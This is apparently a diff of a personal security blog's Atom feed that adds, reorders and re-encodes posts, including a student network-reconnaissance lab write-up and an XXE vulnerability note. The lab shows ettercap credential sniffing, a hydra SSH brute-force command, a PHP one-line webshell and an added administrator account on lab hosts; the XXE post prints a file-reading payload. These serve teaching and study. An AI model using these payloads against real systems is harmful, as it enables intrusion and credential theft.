@@ -37,6 +37,19 @@
   </entry>
   
   <entry>
+    <title>Mac下 安装BurpsuiteProfession</title>
+    <link href="http://h4m5t.github.io/2022/12/26/burpsuite/"/>
+    <id>http://h4m5t.github.io/2022/12/26/burpsuite/</id>
+    <published>2022-12-26T13:22:14.000Z</published>
+    <updated>2022-12-26T13:23:09.911Z</updated>
+    
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
     <title>博客迁移</title>
     <link href="http://h4m5t.github.io/2022/12/04/%E5%8D%9A%E5%AE%A2%E8%BF%81%E7%A7%BB/"/>
     <id>http://h4m5t.github.io/2022/12/04/%E5%8D%9A%E5%AE%A2%E8%BF%81%E7%A7%BB/</id>
@@ -331,29 +344,6 @@
   </entry>
   
   <entry>
-    <title>2021总结</title>
-    <link href="http://h4m5t.github.io/2022/01/03/%E5%B9%B4%E6%80%BB%E7%BB%93/"/>
-    <id>http://h4m5t.github.io/2022/01/03/%E5%B9%B4%E6%80%BB%E7%BB%93/</id>
-    <published>2022-01-02T16:00:00.000Z</published>
-    <updated>2022-12-04T12:01:06.833Z</updated>
-    
-    <content type="html"><![CDATA[<p>岁月蹉跎，转眼已快毕业。2021年还算平稳度过。</p><p>本来想直接就业，3，4月投了很多实习简历，也经历过几次面试。大部分公司石沉大海，直至今日，仍无反应。唯阿里最为迅速，美团最主动，各个部门经常打电话过来。面了几家大厂和乙方龙头企业，都没有如意的结果。深知实战经验缺乏，又难以快速提升。遂作罢，走上考研之路。</p><p>上半年课不算多，都以小组做项目为主，结课之前没有多少时间可以静心复习。</p><ul><li>信息检索：最后写一个小的网页检索项目，基于语言建模的信息检索模型、基于机器学习的排序方法和Web搜索技术、文本聚类技术等。</li><li>内容安全：社交媒体&#x2F;网页中的广告检测项目。</li><li>舆情分析：*国智库人物画像项目。主要内容是文本情感分析。</li></ul><p>真正开始复习是暑假7月份。因为一些契机，也因为不想在基地待下去，报了一个自命题的学校。寻找资料很难，真题都没有，也很少有可以交流的同学。</p><p>一切时间都要靠自己安排，不像高中那样，只跟老师走就行了。这一路也是兜兜转转，不同的老师，不同的资料，转来转去。从汤家凤到张宇，再到武老师。尤其概率，从余炳森，到汤家凤，到王式安，到张宇，最后是方浩。</p><p>半年来，认识了很多真正的好老师。田静，徐涛，武忠祥，李永乐等。虽未谋面，但却像真正耳提面命一般，一路陪伴着我们。</p><p>不知道新的一年，我将在哪里。不管结果如何，上天都会有最好的安排。</p><p>向前走吧。</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;岁月蹉跎，转眼已快毕业。2021年还算平稳度过。&lt;/p&gt;
-&lt;p&gt;本来想直接就业，3，4月投了很多实习简历，也经历过几次面试。大部分公司石沉大海，直至今日，仍无反应。唯阿里最为迅速，美团最主动，各个部门经常打电话过来。面了几家大厂和乙方龙头企业，都没有如意的结果。深知实战经验</summary>
-      
-    
-    
-    
-    <category term="感悟" scheme="http://h4m5t.github.io/categories/%E6%84%9F%E6%82%9F/"/>
-    
-    
-  </entry>
-  
-  <entry>
     <title>密码学笔记</title>
     <link href="http://h4m5t.github.io/2022/01/03/crypto/"/>
     <id>http://h4m5t.github.io/2022/01/03/crypto/</id>
@@ -377,6 +367,29 @@
     
     
     <category term="密码学" scheme="http://h4m5t.github.io/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>2021总结</title>
+    <link href="http://h4m5t.github.io/2022/01/03/%E5%B9%B4%E6%80%BB%E7%BB%93/"/>
+    <id>http://h4m5t.github.io/2022/01/03/%E5%B9%B4%E6%80%BB%E7%BB%93/</id>
+    <published>2022-01-02T16:00:00.000Z</published>
+    <updated>2022-12-04T12:01:06.833Z</updated>
+    
+    <content type="html"><![CDATA[<p>岁月蹉跎，转眼已快毕业。2021年还算平稳度过。</p><p>本来想直接就业，3，4月投了很多实习简历，也经历过几次面试。大部分公司石沉大海，直至今日，仍无反应。唯阿里最为迅速，美团最主动，各个部门经常打电话过来。面了几家大厂和乙方龙头企业，都没有如意的结果。深知实战经验缺乏，又难以快速提升。遂作罢，走上考研之路。</p><p>上半年课不算多，都以小组做项目为主，结课之前没有多少时间可以静心复习。</p><ul><li>信息检索：最后写一个小的网页检索项目，基于语言建模的信息检索模型、基于机器学习的排序方法和Web搜索技术、文本聚类技术等。</li><li>内容安全：社交媒体&#x2F;网页中的广告检测项目。</li><li>舆情分析：*国智库人物画像项目。主要内容是文本情感分析。</li></ul><p>真正开始复习是暑假7月份。因为一些契机，也因为不想在基地待下去，报了一个自命题的学校。寻找资料很难，真题都没有，也很少有可以交流的同学。</p><p>一切时间都要靠自己安排，不像高中那样，只跟老师走就行了。这一路也是兜兜转转，不同的老师，不同的资料，转来转去。从汤家凤到张宇，再到武老师。尤其概率，从余炳森，到汤家凤，到王式安，到张宇，最后是方浩。</p><p>半年来，认识了很多真正的好老师。田静，徐涛，武忠祥，李永乐等。虽未谋面，但却像真正耳提面命一般，一路陪伴着我们。</p><p>不知道新的一年，我将在哪里。不管结果如何，上天都会有最好的安排。</p><p>向前走吧。</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;岁月蹉跎，转眼已快毕业。2021年还算平稳度过。&lt;/p&gt;
+&lt;p&gt;本来想直接就业，3，4月投了很多实习简历，也经历过几次面试。大部分公司石沉大海，直至今日，仍无反应。唯阿里最为迅速，美团最主动，各个部门经常打电话过来。面了几家大厂和乙方龙头企业，都没有如意的结果。深知实战经验</summary>
+      
+    
+    
+    
+    <category term="感悟" scheme="http://h4m5t.github.io/categories/%E6%84%9F%E6%82%9F/"/>
+    
     
   </entry>
   
@@ -699,7 +712,7 @@
     <published>2021-03-24T16:00:00.000Z</published>
     <updated>2022-12-04T11:57:17.084Z</updated>
     
-    <content type="html"><![CDATA[<h1 id="网络侦察实验"><a href="#网络侦察实验" class="headerlink" title="网络侦察实验"></a>网络侦察实验</h1><h3 id="实验背景"><a href="#实验背景" class="headerlink" title="实验背景"></a>实验背景</h3><p>随着时代的发展和网络的普及，在世界各国、各层次的计算机网络中，储存着大量公开资料和机密资料，由于网络漏洞的存在，为“黑客”入侵计算机网络系统获取机密资料提供了很多便利，这些资料引起了各国军事情报部门的重视，都大力开展利用计算机网络系统来获取情报资料的研究和尝试，这便是网络侦察。</p><p>网络侦查是指黑客为了更加有效地实施攻击而在攻击前或攻击过程中对目标主机的所有探测活动。网络侦查有时也被称为“踩点”。通常“踩点”包括以下内容：目标主机的域名、IP地址、操作系统类型、开放了哪些端口，以及这些端口后面运行着什么样的应用程序，这些应用程序有没有漏洞等。那么如何收集信息呢？可以利用与技术无关的“社会工程学”、搜索引擎以及扫描工具。</p><p>本实验旨在通过在企业复杂网络场景下的网络侦查应用实战，让学生深刻理解网络侦查的概念、特性和原理，掌握网络侦查相关技术，具备对网络进行侦查、渗透、敏感信息获取以及防网络侦查的技术能力，这对于学生的信息安全技术能力提升、国家网络空间安全战略实施，都有非常重要的意义。</p><h3 id="实验任务"><a href="#实验任务" class="headerlink" title="实验任务"></a>实验任务</h3><p>任务一 使用nmap、ettercap进行网络侦查和密码嗅探；<br>任务二 使用crunch、hydra暴力破解ssh服务登陆密码；<br>任务三 使用ssh登录目标机，获得敏感信息；<br>任务四 获取目标网站的webshell权限，控制目标机，获得敏感信息。</p><h3 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h3><ul><li>了解网络侦查、信息收集、漏洞挖掘和利用的基本概念以及常用的信息收集和安全漏洞扫描工具，认知常见的网络侦查手段和企业网络安全漏洞。</li><li>掌握nmap工具的功能和操作方法，并能够分析检侧结果，能够运用这些工具解决目标网络信息探测、漏洞挖掘等常见的安全问题。</li><li>了解ettercap嗅探工具的基本功能，掌握常见的嗅探相关服务和应用的用户名和密码的方法。</li><li>了解crunch的基本功能，掌握利用crunch生成密码字典文件的方法。</li><li>了解hydra密码爆破工具的基本功能和使用方法，掌握常见的爆破服务和应用的用户名和密码的方法。</li><li>熟悉网站wenshell的概念，理解上传webshell、获取webshell权限的意义和方法，掌握获取webshell权限基础上控制目标机的方法。</li><li>通过nmap、ettercap、crunch和hydra等工具的学习和使用，能够融会贯通，掌握相关服务如ftp、web等漏洞挖掘、渗透、攻击和利用的原理和方法，掌握自主学习和实践主流企业网络扫描工具的功能、操作技巧、检测结果分析、网络侦查、漏洞挖掘的常用方法，具备企业复杂网络信息安全管理的职业能力和终身学习能力。</li></ul><h3 id="实验工具"><a href="#实验工具" class="headerlink" title="实验工具"></a>实验工具</h3><ul><li>Nmap（集成于kali linux）</li><li>ettercap（集成于kali linux）</li><li>crunch（集成于kali linux）</li><li>hydra（集成于kali linux）</li><li>Firefox（54.2.0）</li><li>Rdesktop</li></ul><h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><table><thead><tr><th>操作系统</th><th>IP地址</th><th>服务器角色</th><th>登录账户密码</th></tr></thead><tbody><tr><td>kali Linux</td><td>192.168.1.2</td><td>操作机</td><td>用户名：root；密码：Simplexue123</td></tr><tr><td>CentOS7</td><td>192.168.1.3</td><td>目标机</td><td>用户名：root；密码：Simplexue123</td></tr><tr><td>Windows2012</td><td>192.168.1.4</td><td>目标机</td><td>用户名：administrator；密码：Simplexue123</td></tr></tbody></table><h3 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h3><h4 id="任务一"><a href="#任务一" class="headerlink" title="任务一"></a>任务一</h4><p>1.扫描存活的主机</p><p><img src="https://i.loli.net/2021/03/25/zPknCDVjpW3Jmlx.png" alt="image-20210325150711857"></p><p>2.使用嗅探工具对目标机的vsftpd服务进行嗅探。</p><p>通过设置监听网卡、主机、开启arp欺骗、启动嗅探等步骤来嗅探网络内的数据包，获取ftp用户名和密码。</p><p><img src="https://i.loli.net/2021/03/25/zlgeGuf3kRQbNYM.png" alt="image-20210325152226044"></p><p><img src="https://i.loli.net/2021/03/25/iZNCDe15ytPux4G.png" alt="image-20210325153309224"></p><h4 id="任务二"><a href="#任务二" class="headerlink" title="任务二"></a>任务二</h4><p>利用kali集成的crunch工具，生成密码字典文件。<br>使用hydra工具暴力破解ssh服务的登陆密码，以便完全控制目标主机系统。</p><p>使用命令<code>crunch 9 9 password.txt -p hacker+123456</code>生成密码</p><p>生成9位的数字字母组合，输出到password.txt文件</p><p><img src="https://i.loli.net/2021/03/25/A9qhKSljfrw3dCU.png" alt="image-20210325154745860"></p><p>使用生成的密码字典进行爆破</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L hacker.txt -P password.txt -t 1 -vV -e ns 192.168.1.3 ssh</span><br></pre></td></tr></table></figure><p>破解得到密码：hacker123</p><h4 id="任务三"><a href="#任务三" class="headerlink" title="任务三"></a>任务三</h4><p>使用ssh登录目标机并获取key值，获得敏感信息</p><p>直接利用 爆破得到的密码进行登陆</p><p>ssh <a href="mailto:&#x68;&#x61;&#99;&#x6b;&#x65;&#x72;&#64;&#x31;&#x39;&#50;&#46;&#49;&#54;&#56;&#x2e;&#x31;&#46;&#x33;">&#x68;&#x61;&#99;&#x6b;&#x65;&#x72;&#64;&#x31;&#x39;&#50;&#46;&#49;&#54;&#56;&#x2e;&#x31;&#46;&#x33;</a></p><p><img src="https://i.loli.net/2021/03/25/2nstiZqjApkCKHP.png" alt="image-20210325155633360"></p><p><img src="https://i.loli.net/2021/03/25/Jmz6WETX9Q8jGPh.png" alt="image-20210325155802866"></p><p>ls -a命令列出文件：1.key</p><p>cat 1.key</p><p>ettercap</p><h4 id="任务四"><a href="#任务四" class="headerlink" title="任务四"></a>任务四</h4><p>获取目标网站的webshell权限，控制目标机，获得敏感信息</p><p>制作一句话木马和上传表单</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#x27;attack&#x27;]) ?&gt;</span><br></pre></td></tr></table></figure><p>在浏览器另外一个页面快速打开<code>http://192.168.1.4/index.php?module=eventregistration&amp;action=eventsCalendar</code>，获得时间戳，分析可知上传的文件名以时间戳+下划线+原文件名称来命名。</p><p>编写脚本并运行，获得上传的文件的URL路径。</p><p><img src="https://i.loli.net/2021/03/25/RhfQO97VjGwEWia.png" alt="image-20210325183510613"></p><p>写入命令</p><p><code>http://192.168.1.4/ tmp/1516041535_exp.php?cmd=system(&#39;&#39; )</code></p><p>添加新用户<code>net user hacker Beijing123 /add</code></p><p>把hacker用户添加到管理员组，并远程连接目标机，远程连接的时候注意远程连接的端口。</p><p>以hacker用户（用户名：hacker、密码：Beijing123）身份登录目标机系统。</p><p>设置目标机C:\2.key文件的可读权限，并查看该文件的具体内容。</p>]]></content>
+    <content type="html"><![CDATA[<h1 id="网络侦察实验"><a href="#网络侦察实验" class="headerlink" title="网络侦察实验"></a>网络侦察实验</h1><h3 id="实验背景"><a href="#实验背景" class="headerlink" title="实验背景"></a>实验背景</h3><p>随着时代的发展和网络的普及，在世界各国、各层次的计算机网络中，储存着大量公开资料和机密资料，由于网络漏洞的存在，为“黑客”入侵计算机网络系统获取机密资料提供了很多便利，这些资料引起了各国军事情报部门的重视，都大力开展利用计算机网络系统来获取情报资料的研究和尝试，这便是网络侦察。</p><p>网络侦查是指黑客为了更加有效地实施攻击而在攻击前或攻击过程中对目标主机的所有探测活动。网络侦查有时也被称为“踩点”。通常“踩点”包括以下内容：目标主机的域名、IP地址、操作系统类型、开放了哪些端口，以及这些端口后面运行着什么样的应用程序，这些应用程序有没有漏洞等。那么如何收集信息呢？可以利用与技术无关的“社会工程学”、搜索引擎以及扫描工具。</p><p>本实验旨在通过在企业复杂网络场景下的网络侦查应用实战，让学生深刻理解网络侦查的概念、特性和原理，掌握网络侦查相关技术，具备对网络进行侦查、渗透、敏感信息获取以及防网络侦查的技术能力，这对于学生的信息安全技术能力提升、国家网络空间安全战略实施，都有非常重要的意义。</p><h3 id="实验任务"><a href="#实验任务" class="headerlink" title="实验任务"></a>实验任务</h3><p>任务一 使用nmap、ettercap进行网络侦查和密码嗅探；<br>任务二 使用crunch、hydra暴力破解ssh服务登陆密码；<br>任务三 使用ssh登录目标机，获得敏感信息；<br>任务四 获取目标网站的webshell权限，控制目标机，获得敏感信息。</p><h3 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h3><ul><li>了解网络侦查、信息收集、漏洞挖掘和利用的基本概念以及常用的信息收集和安全漏洞扫描工具，认知常见的网络侦查手段和企业网络安全漏洞。</li><li>掌握nmap工具的功能和操作方法，并能够分析检侧结果，能够运用这些工具解决目标网络信息探测、漏洞挖掘等常见的安全问题。</li><li>了解ettercap嗅探工具的基本功能，掌握常见的嗅探相关服务和应用的用户名和密码的方法。</li><li>了解crunch的基本功能，掌握利用crunch生成密码字典文件的方法。</li><li>了解hydra密码爆破工具的基本功能和使用方法，掌握常见的爆破服务和应用的用户名和密码的方法。</li><li>熟悉网站wenshell的概念，理解上传webshell、获取webshell权限的意义和方法，掌握获取webshell权限基础上控制目标机的方法。</li><li>通过nmap、ettercap、crunch和hydra等工具的学习和使用，能够融会贯通，掌握相关服务如ftp、web等漏洞挖掘、渗透、攻击和利用的原理和方法，掌握自主学习和实践主流企业网络扫描工具的功能、操作技巧、检测结果分析、网络侦查、漏洞挖掘的常用方法，具备企业复杂网络信息安全管理的职业能力和终身学习能力。</li></ul><h3 id="实验工具"><a href="#实验工具" class="headerlink" title="实验工具"></a>实验工具</h3><ul><li>Nmap（集成于kali linux）</li><li>ettercap（集成于kali linux）</li><li>crunch（集成于kali linux）</li><li>hydra（集成于kali linux）</li><li>Firefox（54.2.0）</li><li>Rdesktop</li></ul><h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><table><thead><tr><th>操作系统</th><th>IP地址</th><th>服务器角色</th><th>登录账户密码</th></tr></thead><tbody><tr><td>kali Linux</td><td>192.168.1.2</td><td>操作机</td><td>用户名：root；密码：Simplexue123</td></tr><tr><td>CentOS7</td><td>192.168.1.3</td><td>目标机</td><td>用户名：root；密码：Simplexue123</td></tr><tr><td>Windows2012</td><td>192.168.1.4</td><td>目标机</td><td>用户名：administrator；密码：Simplexue123</td></tr></tbody></table><h3 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h3><h4 id="任务一"><a href="#任务一" class="headerlink" title="任务一"></a>任务一</h4><p>1.扫描存活的主机</p><p><img src="https://i.loli.net/2021/03/25/zPknCDVjpW3Jmlx.png" alt="image-20210325150711857"></p><p>2.使用嗅探工具对目标机的vsftpd服务进行嗅探。</p><p>通过设置监听网卡、主机、开启arp欺骗、启动嗅探等步骤来嗅探网络内的数据包，获取ftp用户名和密码。</p><p><img src="https://i.loli.net/2021/03/25/zlgeGuf3kRQbNYM.png" alt="image-20210325152226044"></p><p><img src="https://i.loli.net/2021/03/25/iZNCDe15ytPux4G.png" alt="image-20210325153309224"></p><h4 id="任务二"><a href="#任务二" class="headerlink" title="任务二"></a>任务二</h4><p>利用kali集成的crunch工具，生成密码字典文件。<br>使用hydra工具暴力破解ssh服务的登陆密码，以便完全控制目标主机系统。</p><p>使用命令<code>crunch 9 9 password.txt -p hacker+123456</code>生成密码</p><p>生成9位的数字字母组合，输出到password.txt文件</p><p><img src="https://i.loli.net/2021/03/25/A9qhKSljfrw3dCU.png" alt="image-20210325154745860"></p><p>使用生成的密码字典进行爆破</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L hacker.txt -P password.txt -t 1 -vV -e ns 192.168.1.3 ssh</span><br></pre></td></tr></table></figure><p>破解得到密码：hacker123</p><h4 id="任务三"><a href="#任务三" class="headerlink" title="任务三"></a>任务三</h4><p>使用ssh登录目标机并获取key值，获得敏感信息</p><p>直接利用 爆破得到的密码进行登陆</p><p>ssh <a href="mailto:&#104;&#x61;&#x63;&#x6b;&#x65;&#114;&#x40;&#49;&#x39;&#x32;&#x2e;&#49;&#x36;&#x38;&#46;&#x31;&#x2e;&#x33;">&#104;&#x61;&#x63;&#x6b;&#x65;&#114;&#x40;&#49;&#x39;&#x32;&#x2e;&#49;&#x36;&#x38;&#46;&#x31;&#x2e;&#x33;</a></p><p><img src="https://i.loli.net/2021/03/25/2nstiZqjApkCKHP.png" alt="image-20210325155633360"></p><p><img src="https://i.loli.net/2021/03/25/Jmz6WETX9Q8jGPh.png" alt="image-20210325155802866"></p><p>ls -a命令列出文件：1.key</p><p>cat 1.key</p><p>ettercap</p><h4 id="任务四"><a href="#任务四" class="headerlink" title="任务四"></a>任务四</h4><p>获取目标网站的webshell权限，控制目标机，获得敏感信息</p><p>制作一句话木马和上传表单</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#x27;attack&#x27;]) ?&gt;</span><br></pre></td></tr></table></figure><p>在浏览器另外一个页面快速打开<code>http://192.168.1.4/index.php?module=eventregistration&amp;action=eventsCalendar</code>，获得时间戳，分析可知上传的文件名以时间戳+下划线+原文件名称来命名。</p><p>编写脚本并运行，获得上传的文件的URL路径。</p><p><img src="https://i.loli.net/2021/03/25/RhfQO97VjGwEWia.png" alt="image-20210325183510613"></p><p>写入命令</p><p><code>http://192.168.1.4/ tmp/1516041535_exp.php?cmd=system(&#39;&#39; )</code></p><p>添加新用户<code>net user hacker Beijing123 /add</code></p><p>把hacker用户添加到管理员组，并远程连接目标机，远程连接的时候注意远程连接的端口。</p><p>以hacker用户（用户名：hacker、密码：Beijing123）身份登录目标机系统。</p><p>设置目标机C:\2.key文件的可读权限，并查看该文件的具体内容。</p>]]></content>
     
     
       
@@ -906,28 +919,6 @@
   </entry>
   
   <entry>
-    <title>XXE漏洞</title>
-    <link href="http://h4m5t.github.io/2021/03/12/XXE/"/>
-    <id>http://h4m5t.github.io/2021/03/12/XXE/</id>
-    <published>2021-03-11T16:00:00.000Z</published>
-    <updated>2022-12-04T11:54:58.272Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>外部实体注入(XML External Entity XML)。当允许引用外部实体时，通过构造恶意内容，就可能导致任意文件读取、系统命令执行、内网端口探测、攻击内网网站等危害。</p><h3 id="XXE的利用"><a href="#XXE的利用" class="headerlink" title="XXE的利用"></a>XXE的利用</h3><ul><li>读取本地敏感文件</li><li>内网主机探测</li><li>主机端口探测</li><li>盲注</li><li>文件上传</li><li>钓鱼</li></ul><h3 id="文章参考"><a href="#文章参考" class="headerlink" title="文章参考"></a>文章参考</h3><p>先知社区有一篇关于XXE的文章：</p><p><a href="https://xz.aliyun.com/t/3357#toc-17">XXE漏洞及利用</a></p><img src="https://i.loli.net/2021/03/12/LJMZdOSA71DbTB8.png" alt="img" style="zoom: 67%;" /><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">updateProfile</span> [<span class="meta">&lt;!ENTITY <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///c:/windows/win.ini&quot;</span>&gt;</span> ]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">updateProfile</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">firstname</span>&gt;</span>Joe<span class="tag">&lt;/<span class="name">firstname</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">lastname</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">lastname</span>&gt;</span>  </span><br><span class="line">    ... </span><br><span class="line"><span class="tag">&lt;/<span class="name">updateProfile</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h3><ul><li>禁止引用外部实体</li><li>过滤用户提交的XML数据</li></ul>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h3 id=&quot;定义&quot;&gt;&lt;a href=&quot;#定义&quot; class=&quot;headerlink&quot; title=&quot;定义&quot;&gt;&lt;/a&gt;定义&lt;/h3&gt;&lt;p&gt;外部实体注入(XML External Entity XML)。当允许引用外部实体时，通过构造恶意内容，就可能导致任意文件读取、系统命令执行</summary>
-      
-    
-    
-    
-    <category term="漏洞" scheme="http://h4m5t.github.io/categories/%E6%BC%8F%E6%B4%9E/"/>
-    
-    
-  </entry>
-  
-  <entry>
     <title>关于WAF</title>
     <link href="http://h4m5t.github.io/2021/03/12/WAF/"/>
     <id>http://h4m5t.github.io/2021/03/12/WAF/</id>
@@ -946,6 +937,28 @@
     
     
     <category term="安全" scheme="http://h4m5t.github.io/categories/%E5%AE%89%E5%85%A8/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>XXE漏洞</title>
+    <link href="http://h4m5t.github.io/2021/03/12/XXE/"/>
+    <id>http://h4m5t.github.io/2021/03/12/XXE/</id>
+    <published>2021-03-11T16:00:00.000Z</published>
+    <updated>2022-12-04T11:54:58.272Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>外部实体注入(XML External Entity XML)。当允许引用外部实体时，通过构造恶意内容，就可能导致任意文件读取、系统命令执行、内网端口探测、攻击内网网站等危害。</p><h3 id="XXE的利用"><a href="#XXE的利用" class="headerlink" title="XXE的利用"></a>XXE的利用</h3><ul><li>读取本地敏感文件</li><li>内网主机探测</li><li>主机端口探测</li><li>盲注</li><li>文件上传</li><li>钓鱼</li></ul><h3 id="文章参考"><a href="#文章参考" class="headerlink" title="文章参考"></a>文章参考</h3><p>先知社区有一篇关于XXE的文章：</p><p><a href="https://xz.aliyun.com/t/3357#toc-17">XXE漏洞及利用</a></p><img src="https://i.loli.net/2021/03/12/LJMZdOSA71DbTB8.png" alt="img" style="zoom: 67%;" /><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">updateProfile</span> [<span class="meta">&lt;!ENTITY <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///c:/windows/win.ini&quot;</span>&gt;</span> ]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">updateProfile</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">firstname</span>&gt;</span>Joe<span class="tag">&lt;/<span class="name">firstname</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">lastname</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">lastname</span>&gt;</span>  </span><br><span class="line">    ... </span><br><span class="line"><span class="tag">&lt;/<span class="name">updateProfile</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h3><ul><li>禁止引用外部实体</li><li>过滤用户提交的XML数据</li></ul>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h3 id=&quot;定义&quot;&gt;&lt;a href=&quot;#定义&quot; class=&quot;headerlink&quot; title=&quot;定义&quot;&gt;&lt;/a&gt;定义&lt;/h3&gt;&lt;p&gt;外部实体注入(XML External Entity XML)。当允许引用外部实体时，通过构造恶意内容，就可能导致任意文件读取、系统命令执行</summary>
+      
+    
+    
+    
+    <category term="漏洞" scheme="http://h4m5t.github.io/categories/%E6%BC%8F%E6%B4%9E/"/>
     
     
   </entry>
@@ -1443,7 +1456,7 @@
     <published>2021-01-27T16:00:00.000Z</published>
     <updated>2022-12-04T11:45:10.983Z</updated>
     
-    <content type="html"><![CDATA[<h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>同源策略是指在Web浏览器中，允许某个网页脚本访问另一个网页的数据，但前提是这两个网页必须同源。此策略可防止某个网页上的恶意脚本通过该页面的文档对象模型访问另一网页上的敏感数据。</p><p>同源的判断如下：</p><ul><li>协议相同</li><li>域名相同</li><li>端口相同</li></ul><h3 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h3><p>同源策略对Web应用程序具有特殊意义，因为Web应用程序广泛依赖于cookie来维持用户会话，所以必须将不相关网站严格分隔，以防止丢失数据泄露。</p><h3 id="同源比较"><a href="#同源比较" class="headerlink" title="同源比较"></a>同源比较</h3><p>下表列出哪些URL与<a href="http://www.example.com/dir/page.html">http://www.example.com/dir/page.html</a> 属于相同来源</p><table><thead><tr><th>http:&#x2F;&#x2F;<strong>en.example.com</strong>&#x2F;dir&#x2F;other.html</th><th>否</th><th>不同域名</th></tr></thead><tbody><tr><td>http:&#x2F;&#x2F;<strong>example.com</strong>&#x2F;dir&#x2F;other.html</td><td>否</td><td>不同域名（需要完全匹配）</td></tr><tr><td>**http:&#x2F;&#x2F;**username:<a href="mailto:&#x70;&#97;&#x73;&#115;&#119;&#x6f;&#114;&#x64;&#64;&#119;&#119;&#x77;&#x2e;&#101;&#120;&#x61;&#x6d;&#112;&#x6c;&#101;&#x2e;&#99;&#111;&#109;">&#x70;&#97;&#x73;&#115;&#119;&#x6f;&#114;&#x64;&#64;&#119;&#119;&#x77;&#x2e;&#101;&#120;&#x61;&#x6d;&#112;&#x6c;&#101;&#x2e;&#99;&#111;&#109;</a>&#x2F;dir2&#x2F;other.html</td><td>是</td><td>只有路径不同</td></tr><tr><td><a href="http://v2.www.example.com/dir/other.html">http://v2.www.example.com/dir/other.html</a></td><td>否</td><td>不同域名（需要完全匹配）</td></tr><tr><td><a href="http://www.example.com:**81**/dir/other.html">http://www.example.com:**81**/dir/other.html</a></td><td>否</td><td>不同端口（若未标明，http:&#x2F;&#x2F; 默认端口号为80）</td></tr><tr><td><strong><a href="http://www.example.com/">http://www.example.com</a></strong>&#x2F;dir&#x2F;page2.html</td><td>是</td><td>只有路径不同</td></tr><tr><td><strong><a href="http://www.example.com/">http://www.example.com</a></strong>&#x2F;dir2&#x2F;other.html</td><td>是</td><td>只有路径不同</td></tr><tr><td><strong>https</strong>:&#x2F;&#x2F;<a href="http://www.example.com/dir/other.html">www.example.com/dir/other.html</a></td><td>否</td><td>不同协议（<a href="https://zh.wikipedia.org/wiki/Https">https</a>和<a href="https://zh.wikipedia.org/wiki/Http">http</a>）</td></tr></tbody></table><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ul><li>源的继承：在页面中通过 <code>about:blank</code> 或 <code>javascript:</code> URL 执行的脚本会继承打开该 URL 的文档的源，因为这些类型的 URLs 没有包含源服务器的相关信息。</li><li>跨源访问：可以使用 CORS 来允许跨源访问。CORS 是 HTTP 的一部分，它允许服务端来指定哪些主机可以从这个服务端加载资源。</li><li>源的更改：满足某些限制条件的情况下，页面是可以修改它的源。脚本可以将 document.domain 的值设置为其当前域或其当前域的父域。如果将其设置为其当前域的父域，则这个较短的父域将用于后续源检查。</li></ul><h3 id="缺陷"><a href="#缺陷" class="headerlink" 